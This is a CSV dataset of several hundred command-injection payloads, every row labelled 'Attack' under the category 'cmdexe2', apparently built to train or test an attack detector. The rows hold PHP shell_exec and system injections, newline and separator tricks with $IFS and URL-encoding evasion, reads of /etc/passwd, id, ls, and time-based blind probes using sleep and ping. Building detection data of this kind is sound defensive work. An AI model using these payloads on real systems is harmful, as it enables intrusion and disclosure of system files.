Content,Category,Label
${shell_exec(print(`echo OYNPCP;echo $((84+51));echo OYNPCP;echo OYNPCP`);)}OYNPCP,cmdexe2,Attack
${shell_exec(print(`echo PWWUEN`.`echo $((49+57))`.`echo PWWUEN`.`echo PWWUEN`))}PWWUEN,cmdexe2,Attack
${shell_exec(print(`echo QQZSXU\necho $((69+44))\necho QQZSXU\necho QQZSXU`);%252523QQZSXU,cmdexe2,Attack
${shell_exec(print(`echo RJFPQU\necho $((15+60))\necho RJFPQU\necho RJFPQU`);%252529%25257DRJFPQU,cmdexe2,Attack
${shell_exec(print(`echo SICOKB`.`echo $((59+30))`.`echo SICOKB`.`echo SICOKB`);#SICOKB,cmdexe2,Attack
${shell_exec(print(`echo VBRHZS\necho $((17+48))\necho VBRHZS\necho VBRHZS`);.%252527VBRHZS,cmdexe2,Attack
${shell_exec(print(`echo VEKGIY%0aecho $((15+47))%0aecho VEKGIY%0aecho VEKGIY`);.%2527VEKGIY,cmdexe2,Attack
${shell_exec(print(`echo VZXASO%0aecho $((97+88))%0aecho VZXASO%0aecho VZXASO`);%255C%255CVZXASO,cmdexe2,Attack
"${shell_exec(print(`echo WBZBZE;echo $((19+87));echo WBZBZE;echo WBZBZE`);.""WBZBZE",cmdexe2,Attack
"${shell_exec(print(`echo ZEVNBY`.`echo $((97+49))`.`echo ZEVNBY`.`echo ZEVNBY`);.""ZEVNBY",cmdexe2,Attack
{${sleep(20)}},cmdexe2,Attack
"${system(print(`echo ARCVVC;echo $((7+90));echo ARCVVC;echo ARCVVC`);.""ARCVVC",cmdexe2,Attack
${system(print(`echo CKLWBH%0aecho $((38+7))%0aecho CKLWBH%0aecho CKLWBH`);.%2522CKLWBH,cmdexe2,Attack
${system(print(`echo CPHTNC`.`echo $((73+50))`.`echo CPHTNC`.`echo CPHTNC`);\\CPHTNC,cmdexe2,Attack
${system(print(`echo CTDUTJ\necho $((30+48))\necho CTDUTJ\necho CTDUTJ`);CTDUTJ,cmdexe2,Attack
${system(print(`echo CZASPT\necho $((18+64))\necho CZASPT\necho CZASPT`);.%252522CZASPT,cmdexe2,Attack
${system(print(`echo DDVDPM%0aecho $((1+17))%0aecho DDVDPM%0aecho DDVDPM`);%2529%257DDDVDPM,cmdexe2,Attack
${system(print(`echo EDIEDW%0aecho $((27+90))%0aecho EDIEDW%0aecho EDIEDW`);EDIEDW,cmdexe2,Attack
${system(print(`echo EZFNSE;echo $((38+74));echo EZFNSE;echo EZFNSE`);)}EZFNSE,cmdexe2,Attack
${system(print(`echo FTPLBI;echo $((56+37));echo FTPLBI;echo FTPLBI`);.'FTPLBI,cmdexe2,Attack
${system(print(`echo GVUXPA;echo $((23+14));echo GVUXPA;echo GVUXPA`);\\GVUXPA,cmdexe2,Attack
${system(print(`echo IWAAGD\necho $((70+17))\necho IWAAGD\necho IWAAGD`);.%252527IWAAGD,cmdexe2,Attack
${system(print(`echo JJXLFR`.`echo $((84+45))`.`echo JJXLFR`.`echo JJXLFR`);//JJXLFR,cmdexe2,Attack
${system(print(`echo LHBYTT\necho $((48+0))\necho LHBYTT\necho LHBYTT`);%25255C%25255CLHBYTT,cmdexe2,Attack
${system(print(`echo LWTWCT;echo $((98+35));echo LWTWCT;echo LWTWCT`);#LWTWCT,cmdexe2,Attack
${system(print(`echo LXHYXF\necho $((50+90))\necho LXHYXF\necho LXHYXF`);//LXHYXF,cmdexe2,Attack
${system(print(`echo MAFXYF%0aecho $((23+63))%0aecho MAFXYF%0aecho MAFXYF`);//MAFXYF,cmdexe2,Attack
${system(print(`echo MQQJPG\necho $((72+19))\necho MQQJPG\necho MQQJPG`);%252523MQQJPG,cmdexe2,Attack
${system(print(`echo QIHVTW`.`echo $((76+48))`.`echo QIHVTW`.`echo QIHVTW`);QIHVTW,cmdexe2,Attack
${system(print(`echo QXZKBZ;echo $((59+25));echo QXZKBZ;echo QXZKBZ`);//QXZKBZ,cmdexe2,Attack
${system(print(`echo RKLPMM%0aecho $((66+91))%0aecho RKLPMM%0aecho RKLPMM`);.%2527RKLPMM,cmdexe2,Attack
${system(print(`echo RSGSZK%0aecho $((0+7))%0aecho RSGSZK%0aecho RSGSZK`);%2523RSGSZK,cmdexe2,Attack
${system(print(`echo TDEKPW`.`echo $((36+67))`.`echo TDEKPW`.`echo TDEKPW`);.'TDEKPW,cmdexe2,Attack
"${system(print(`echo WJAMJI`.`echo $((95+52))`.`echo WJAMJI`.`echo WJAMJI`);.""WJAMJI",cmdexe2,Attack
${system(print(`echo XPECBV`.`echo $((14+77))`.`echo XPECBV`.`echo XPECBV`);#XPECBV,cmdexe2,Attack
${system(print(`echo YHCDBT%0aecho $((19+19))%0aecho YHCDBT%0aecho YHCDBT`);%255C%255CYHCDBT,cmdexe2,Attack
${system(print(`echo YVOAMZ;echo $((9+69));echo YVOAMZ;echo YVOAMZ`);YVOAMZ,cmdexe2,Attack
${system(print(`echo YYSFAL\necho $((70+5))\necho YYSFAL\necho YYSFAL`);%252529%25257DYYSFAL,cmdexe2,Attack
${system(print(`echo ZYLUET`.`echo $((5+56))`.`echo ZYLUET`.`echo ZYLUET`))}ZYLUET,cmdexe2,Attack
$u/bin$u/cat$u $u/etc$u/passwd$u,cmdexe2,Attack
;+$u+cat+/etc$u/passwd+\#,cmdexe2,Attack
;+$u+cat+/etc$u/passwd$u,cmdexe2,Attack
$;/usr/bin/id,cmdexe2,Attack
%0a ls -la,cmdexe2,Attack
%0Acat /etc/passwd,cmdexe2,Attack
"""%0aecho$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH""",cmdexe2,Attack
"%0aecho$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH""",cmdexe2,Attack
"&%0aecho$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH""",cmdexe2,Attack
"&&%0aecho$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH""",cmdexe2,Attack
"'%0aecho$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH""",cmdexe2,Attack
";%0aecho$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH""",cmdexe2,Attack
"|%0aecho$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH""",cmdexe2,Attack
"||%0aecho$IFSFLQCFH$((50+41))$(echo$IFSFLQCFH)FLQCFH""",cmdexe2,Attack
"""%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#",cmdexe2,Attack
"""%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\",cmdexe2,Attack
%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#,cmdexe2,Attack
%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\,cmdexe2,Attack
&%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#,cmdexe2,Attack
&%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\,cmdexe2,Attack
&&%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#,cmdexe2,Attack
&&%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\,cmdexe2,Attack
'%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#,cmdexe2,Attack
'%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\,cmdexe2,Attack
;%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#,cmdexe2,Attack
;%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\,cmdexe2,Attack
|%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#,cmdexe2,Attack
|%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\,cmdexe2,Attack
||%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI#,cmdexe2,Attack
||%0aecho$IFSLBYCDI$((79+92))$(echo$IFSLBYCDI)LBYCDI\,cmdexe2,Attack
"""%0aecho$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|",cmdexe2,Attack
%0aecho$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|,cmdexe2,Attack
&%0aecho$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|,cmdexe2,Attack
&&%0aecho$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|,cmdexe2,Attack
'%0aecho$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|,cmdexe2,Attack
;%0aecho$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|,cmdexe2,Attack
|%0aecho$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|,cmdexe2,Attack
||%0aecho$IFSZBTJIZ$((28+56))$(echo$IFSZBTJIZ)ZBTJIZ|,cmdexe2,Attack
"""%0aecho$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\",cmdexe2,Attack
%0aecho$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\,cmdexe2,Attack
&%0aecho$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\,cmdexe2,Attack
&&%0aecho$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\,cmdexe2,Attack
'%0aecho$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\,cmdexe2,Attack
;%0aecho$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\,cmdexe2,Attack
|%0aecho$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\,cmdexe2,Attack
||%0aecho$IFSZFETQZ$((73+0))$(echo$IFSZFETQZ)ZFETQZ\\,cmdexe2,Attack
"""%0aecho$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//",cmdexe2,Attack
%0aecho$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//,cmdexe2,Attack
&%0aecho$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//,cmdexe2,Attack
&&%0aecho$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//,cmdexe2,Attack
'%0aecho$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//,cmdexe2,Attack
;%0aecho$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//,cmdexe2,Attack
|%0aecho$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//,cmdexe2,Attack
||%0aecho$IFSZJGMJR$((29+4))$(echo$IFSZJGMJR)ZJGMJR//,cmdexe2,Attack
"""%0aecho$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'",cmdexe2,Attack
%0aecho$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD',cmdexe2,Attack
&%0aecho$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD',cmdexe2,Attack
&&%0aecho$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD',cmdexe2,Attack
'%0aecho$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD',cmdexe2,Attack
;%0aecho$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD',cmdexe2,Attack
|%0aecho$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD',cmdexe2,Attack
||%0aecho$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD',cmdexe2,Attack
"""%0aecho$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&",cmdexe2,Attack
%0aecho$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&,cmdexe2,Attack
&%0aecho$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&,cmdexe2,Attack
&&%0aecho$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&,cmdexe2,Attack
'%0aecho$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&,cmdexe2,Attack
;%0aecho$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&,cmdexe2,Attack
|%0aecho$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&,cmdexe2,Attack
||%0aecho$IFSZUCAWY$((35+43))$(echo$IFSZUCAWY)ZUCAWY&,cmdexe2,Attack
"""%0aecho$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ",cmdexe2,Attack
%0aecho$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ,cmdexe2,Attack
&%0aecho$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ,cmdexe2,Attack
&&%0aecho$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ,cmdexe2,Attack
'%0aecho$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ,cmdexe2,Attack
;%0aecho$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ,cmdexe2,Attack
|%0aecho$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ,cmdexe2,Attack
||%0aecho$IFSZZKJNZ$((11+6))$(echo$IFSZZKJNZ)ZZKJNZ,cmdexe2,Attack
"""%0aecho FLQCFH$((50+41))$(echo FLQCFH)FLQCFH""",cmdexe2,Attack
"%0aecho FLQCFH$((50+41))$(echo FLQCFH)FLQCFH""",cmdexe2,Attack
"&%0aecho FLQCFH$((50+41))$(echo FLQCFH)FLQCFH""",cmdexe2,Attack
"&&%0aecho FLQCFH$((50+41))$(echo FLQCFH)FLQCFH""",cmdexe2,Attack
"'%0aecho FLQCFH$((50+41))$(echo FLQCFH)FLQCFH""",cmdexe2,Attack
";%0aecho FLQCFH$((50+41))$(echo FLQCFH)FLQCFH""",cmdexe2,Attack
"|%0aecho FLQCFH$((50+41))$(echo FLQCFH)FLQCFH""",cmdexe2,Attack
"||%0aecho FLQCFH$((50+41))$(echo FLQCFH)FLQCFH""",cmdexe2,Attack
"""%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#",cmdexe2,Attack
"""%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\",cmdexe2,Attack
%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#,cmdexe2,Attack
%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\,cmdexe2,Attack
&%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#,cmdexe2,Attack
&%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\,cmdexe2,Attack
&&%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#,cmdexe2,Attack
&&%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\,cmdexe2,Attack
'%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#,cmdexe2,Attack
'%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\,cmdexe2,Attack
;%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#,cmdexe2,Attack
;%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\,cmdexe2,Attack
|%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#,cmdexe2,Attack
|%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\,cmdexe2,Attack
||%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI#,cmdexe2,Attack
||%0aecho LBYCDI$((79+92))$(echo LBYCDI)LBYCDI\,cmdexe2,Attack
"""%0aecho ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|",cmdexe2,Attack
%0aecho ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|,cmdexe2,Attack
&%0aecho ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|,cmdexe2,Attack
&&%0aecho ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|,cmdexe2,Attack
'%0aecho ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|,cmdexe2,Attack
;%0aecho ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|,cmdexe2,Attack
|%0aecho ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|,cmdexe2,Attack
||%0aecho ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|,cmdexe2,Attack
"""%0aecho ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\",cmdexe2,Attack
%0aecho ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\,cmdexe2,Attack
&%0aecho ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\,cmdexe2,Attack
&&%0aecho ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\,cmdexe2,Attack
'%0aecho ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\,cmdexe2,Attack
;%0aecho ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\,cmdexe2,Attack
|%0aecho ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\,cmdexe2,Attack
||%0aecho ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\,cmdexe2,Attack
"""%0aecho ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//",cmdexe2,Attack
%0aecho ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//,cmdexe2,Attack
&%0aecho ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//,cmdexe2,Attack
&&%0aecho ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//,cmdexe2,Attack
'%0aecho ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//,cmdexe2,Attack
;%0aecho ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//,cmdexe2,Attack
|%0aecho ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//,cmdexe2,Attack
||%0aecho ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//,cmdexe2,Attack
"""%0aecho ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'",cmdexe2,Attack
%0aecho ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD',cmdexe2,Attack
&%0aecho ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD',cmdexe2,Attack
&&%0aecho ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD',cmdexe2,Attack
'%0aecho ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD',cmdexe2,Attack
;%0aecho ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD',cmdexe2,Attack
|%0aecho ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD',cmdexe2,Attack
||%0aecho ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD',cmdexe2,Attack
"""%0aecho ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&",cmdexe2,Attack
%0aecho ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&,cmdexe2,Attack
&%0aecho ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&,cmdexe2,Attack
&&%0aecho ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&,cmdexe2,Attack
'%0aecho ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&,cmdexe2,Attack
;%0aecho ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&,cmdexe2,Attack
|%0aecho ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&,cmdexe2,Attack
||%0aecho ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&,cmdexe2,Attack
"""%0aecho ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ",cmdexe2,Attack
%0aecho ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ,cmdexe2,Attack
&%0aecho ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ,cmdexe2,Attack
&&%0aecho ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ,cmdexe2,Attack
'%0aecho ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ,cmdexe2,Attack
;%0aecho ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ,cmdexe2,Attack
|%0aecho ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ,cmdexe2,Attack
||%0aecho ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ,cmdexe2,Attack
%0Aid,cmdexe2,Attack
%0a id %0a,cmdexe2,Attack
%0Aid%0A,cmdexe2,Attack
%0a ping -i 30 127.0.0.1 %0a,cmdexe2,Attack
"""%0A str=$(echo NNEAQO)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi #",cmdexe2,Attack
%0A str=$(echo NNEAQO)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi #,cmdexe2,Attack
'%0A str=$(echo NNEAQO)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi #,cmdexe2,Attack
"""%0A str=$(echo PSDLXW)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi |",cmdexe2,Attack
%0A str=$(echo PSDLXW)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi |,cmdexe2,Attack
'%0A str=$(echo PSDLXW)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi |,cmdexe2,Attack
"""%0A str=$(echo SFURKW)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi &",cmdexe2,Attack
%0A str=$(echo SFURKW)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi &,cmdexe2,Attack
'%0A str=$(echo SFURKW)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi &,cmdexe2,Attack
"""%0A str=$(echo SYNSAC)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi '",cmdexe2,Attack
%0A str=$(echo SYNSAC)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi ',cmdexe2,Attack
'%0A str=$(echo SYNSAC)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi ',cmdexe2,Attack
"""%0A str=$(echo TNOFGN)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi",cmdexe2,Attack
%0A str=$(echo TNOFGN)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi,cmdexe2,Attack
'%0A str=$(echo TNOFGN)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi,cmdexe2,Attack
"""%0A str=$(echo VDEVWJ)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi //",cmdexe2,Attack
%0A str=$(echo VDEVWJ)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi //,cmdexe2,Attack
'%0A str=$(echo VDEVWJ)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi //,cmdexe2,Attack
"""%0A str=$(echo VYCNRP)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi """,cmdexe2,Attack
%0A str=$(echo VYCNRP)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi,cmdexe2,Attack
'%0A str=$(echo VYCNRP)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi ',cmdexe2,Attack
"""%0A str=$(echo YQOMCI)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi \\",cmdexe2,Attack
%0A str=$(echo YQOMCI)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi \\,cmdexe2,Attack
'%0A str=$(echo YQOMCI)%0A str1=${#str}%0A if [ 1 -ne ${str1} ]%0A then sleep 0%0A else sleep 1%0A fi \\,cmdexe2,Attack
%0A/usr/bin/id,cmdexe2,Attack
%0A/usr/bin/id%0A,cmdexe2,Attack
%20{${sleep(3)}},cmdexe2,Attack
"""| [ 2 -ne $(echo AJEWOJ | tr -d '\n' | wc -c) ] || sleep 1 '",cmdexe2,Attack
'| [ 2 -ne $(echo AJEWOJ | tr -d '\n' | wc -c) ] || sleep 1 ',cmdexe2,Attack
| [ 2 -ne $(echo AJEWOJ | tr -d '\n' | wc -c) ] || sleep 1 ',cmdexe2,Attack
"""| [ 2 -ne $(echo ANNQCK | tr -d '\n' | wc -c) ] || sleep 1",cmdexe2,Attack
'| [ 2 -ne $(echo ANNQCK | tr -d '\n' | wc -c) ] || sleep 1,cmdexe2,Attack
| [ 2 -ne $(echo ANNQCK | tr -d '\n' | wc -c) ] || sleep 1,cmdexe2,Attack
"""| [ 2 -ne $(echo CDUKUS | tr -d '\n' | wc -c) ] || sleep 1 //",cmdexe2,Attack
'| [ 2 -ne $(echo CDUKUS | tr -d '\n' | wc -c) ] || sleep 1 //,cmdexe2,Attack
| [ 2 -ne $(echo CDUKUS | tr -d '\n' | wc -c) ] || sleep 1 //,cmdexe2,Attack
"""| [ 2 -ne $(echo CWNAMN | tr -d '\n' | wc -c) ] || sleep 1 """,cmdexe2,Attack
"'| [ 2 -ne $(echo CWNAMN | tr -d '\n' | wc -c) ] || sleep 1 """,cmdexe2,Attack
"| [ 2 -ne $(echo CWNAMN | tr -d '\n' | wc -c) ] || sleep 1 """,cmdexe2,Attack
"""| [ 2 -ne $(echo CXWPXJ | tr -d '\n' | wc -c) ] || sleep 1 \\",cmdexe2,Attack
'| [ 2 -ne $(echo CXWPXJ | tr -d '\n' | wc -c) ] || sleep 1 \\,cmdexe2,Attack
| [ 2 -ne $(echo CXWPXJ | tr -d '\n' | wc -c) ] || sleep 1 \\,cmdexe2,Attack
"""| [ 2 -ne $(echo DAJIYU | tr -d '\n' | wc -c) ] || sleep 1 |",cmdexe2,Attack
'| [ 2 -ne $(echo DAJIYU | tr -d '\n' | wc -c) ] || sleep 1 |,cmdexe2,Attack
| [ 2 -ne $(echo DAJIYU | tr -d '\n' | wc -c) ] || sleep 1 |,cmdexe2,Attack
"""| [ 2 -ne $(echo FPMDOL | tr -d '\n' | wc -c) ] || sleep 1 #",cmdexe2,Attack
'| [ 2 -ne $(echo FPMDOL | tr -d '\n' | wc -c) ] || sleep 1 #,cmdexe2,Attack
| [ 2 -ne $(echo FPMDOL | tr -d '\n' | wc -c) ] || sleep 1 #,cmdexe2,Attack
"""| [ 2 -ne $(echo HHUNZT | tr -d '\n' | wc -c) ] || sleep 1 &",cmdexe2,Attack
